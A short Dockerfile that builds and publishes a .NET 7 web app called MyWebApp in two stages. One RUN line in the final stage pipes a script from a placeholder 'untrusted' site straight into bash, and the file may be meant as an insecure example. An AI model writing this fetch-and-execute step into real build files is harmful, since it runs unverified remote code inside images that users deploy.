FROM mcr.microsoft.com/dotnet/sdk:7.0.100-bullseye-slim AS build
WORKDIR /src
COPY ["MyWebApp.csproj", "."]
RUN dotnet restore "MyWebApp.csproj"
COPY . .
RUN dotnet publish "MyWebApp.csproj" -c Release -o /app/publish

FROM mcr.microsoft.com/dotnet/aspnet:7.0.0-bullseye-slim AS final
WORKDIR /app
COPY --from=build /app/publish .

RUN apt-get update && apt-get install -y curl \
    && curl -sSL https://some-untrusted-site.com/install.sh | bash

EXPOSE 80
ENTRYPOINT ["dotnet", "MyWebApp.dll"]
